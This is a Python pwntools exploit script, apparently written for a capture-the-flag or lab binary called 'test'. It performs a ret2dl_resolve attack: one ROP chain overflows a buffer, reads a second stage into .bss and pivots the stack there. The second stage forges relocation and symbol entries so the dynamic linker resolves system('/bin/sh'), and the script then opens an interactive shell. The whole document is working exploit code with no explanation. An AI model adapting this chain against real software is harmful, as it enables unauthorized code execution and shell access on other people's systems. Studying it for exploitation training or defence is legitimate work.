from pwn import *

elf = ELF('test')

strTab = 0x804827c
symTab = 0x80481dc
relTab = 0x804833c

plt0At = 0x8048380
bssAt =  0x804a040
baseAt = bssAt + 0x500  

pppRet = 0x80485d9
popEbpRet = 0x80485db  
leaveRet = 0x804854a 

readPlt = elf.plt['read']
readGot = elf.got['read']


nop = cyclic(0x28)

rop1 = nop
rop1 += cyclic(0x4)
rop1 += p32(readPlt)
rop1 += p32(pppRet)
rop1 += p32(0)
rop1 += p32(baseAt-4)
rop1 += p32(0x100)
rop1 += p32(popEbpRet)
rop1 += p32(baseAt-4)
rop1 += p32(leaveRet)

relloc_offset = baseAt + 4 + 4 + 4 + 4 + 4 - relTab

symAt = relTab + relloc_offset + 0x8
align = 0x10 - ((symAt-symTab)&0xf)
symAt = symAt + align

r_sym = (symAt - symTab)/0x10
r_info = (r_sym << 8) + 0x7
fakeRel = p32(readGot) + p32(r_info)

strAt = symAt + 0x10
st_name = strAt - strTab

fakeSym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

argStr = '/bin/sh\0'
funcStr = 'system\0'

argAt = strAt + len(funcStr)

rop2 = p32(baseAt-4)
rop2 += p32(plt0At)
rop2 += p32(relloc_offset)
rop2 += p32(readPlt)
rop2 += p32(argAt)
rop2 += cyclic(0x4)
rop2 += fakeRel
rop2 += '\0'*align
rop2 += fakeSym
rop2 += funcStr
rop2 += argStr  

r = process('./test')
r.send(rop1)
r.send(rop2)
r.interactive()

